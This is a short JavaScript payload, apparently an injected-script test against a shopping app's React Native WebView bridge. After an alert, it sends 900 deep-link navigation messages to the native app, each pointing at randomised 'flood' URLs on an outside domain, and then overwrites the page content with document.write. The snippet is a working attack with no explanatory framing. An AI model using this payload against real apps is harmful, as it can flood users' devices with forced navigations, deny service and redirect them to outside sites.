alert('test_js3');
for(let i=0; i<900; i++) {
  window.ReactNativeWebView.postMessage(JSON.stringify({
  action: 'navigateDeepLink',
  data: 'sbermarket://landing?url=https://tiburon-research.ru/flood-' + i + '-' + Date.now() + '-' + Math.random().toString(36).substr(2)
  }));
}
document.open();
document.write('<html><body><h1>New Content</h1></body></html>');
document.close();
